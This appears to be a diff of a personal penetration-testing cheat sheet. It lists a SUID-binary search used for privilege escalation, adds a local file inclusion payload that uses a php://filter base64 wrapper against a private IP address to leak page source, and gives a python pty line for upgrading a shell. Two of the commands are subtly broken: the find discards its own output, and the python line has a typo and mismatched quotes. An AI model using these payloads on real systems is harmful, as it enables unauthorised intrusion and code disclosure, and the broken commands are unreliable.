@@ -1,6 +1,9 @@
 find su permetion
 find / -perm -u=s -type f >/dev/null
 =================================
+LFI
+http://192.168.1.10/?lang=php://filter/convert.base64-encode/resource=index
+====================================================
 python-c  "import pty;pty.spawn("/bin/sh")
 
 ==============================================
